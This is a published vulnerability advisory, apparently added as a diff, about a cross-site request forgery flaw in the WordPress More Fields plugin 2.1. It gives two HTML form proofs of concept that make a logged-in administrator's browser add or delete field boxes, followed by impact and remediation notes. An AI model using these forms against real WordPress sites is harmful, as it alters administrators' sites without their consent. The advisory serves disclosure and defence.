@@ -1,0 +1,65 @@
+# Exploit Title: Wordpress More Fields Plugin 2.1 Cross-Site Request Forgery 
+# Date: 28-02-2016
+# Software Link: https://wordpress.org/support/plugin/more-fields
+# Exploit Author: Aatif Shahdad
+# Twitter: https://twitter.com/61617469665f736
+# Contact: aatif_shahdad@icloud.com
+# Category: webapps
+ 
+1. Description
+   
+The plugin More Fields has CSRF token validation disabled for all functions, including the add box and delete box options. As a result, a specially crafted attacker page could cause
+a logged-in administrator to add and delete any number of extra fields in any number of additional boxes on the Write/Edit page in the Admin.
+   
+2. Proof of Concept
+ 
+Login as admin to the wp-admin area at http://example.com/wp-admin. Open the following Proof-Of-Concept with the browser that you used to log in.
+
+POC to add box named ‘test’:
+
+--POC begins--
+Add Boxes:
+
+<html>
+  <body>
+    <form action="https://example.com/wp­admin/options­general.php?page=more-
+fields&action=save&keys=_plugin%2C57UPhPh&navigation=boxes" method="POST">
+      <input type="hidden" name="label" value="test" />
+      <input type="hidden" name="post&#95;types&#91;&#93;" value="press" />
+      <input type="hidden" name="position" value="left" />
+      <input type="hidden" name="fields" value="" />
+      <input type="hidden" name="ancestor&#95;key" value="" />
+      <input type="hidden" name="originating&#95;keys" value="&#95;plugin&#44;57UPhPh" />
+      <input type="hidden" name="action" value="save" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+Remove Boxes needs the following simple GET request (Assuming the name of the Box we want to delete is ‘test’):
+
+<html>
+  <body>
+    <form action="https://example.com/wp­admin/options­general.php">
+      <input type="hidden" name="page" value="more&#45;fields" />
+      <input type="hidden" name="action" value="delete" />
+      <input type="hidden" name="action&#95;keys" value="&#95;plugin&#44;test" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+Note: I have removed the CSRF tokens from the requests as they are redundant and not validated.
+
+--End of POC--
+
+
+3. Impact
+
+The attacker can add/delete any number of extra fields in any number of additional boxes on the Write/Edit page in the Admin.
+
+4. Solution:
+   
+Add in CSRF token validation to the plugin or switch to a different plugin. The development of the Plugin has ceased so this happens to be the latest version which can’t be upgraded as of now.
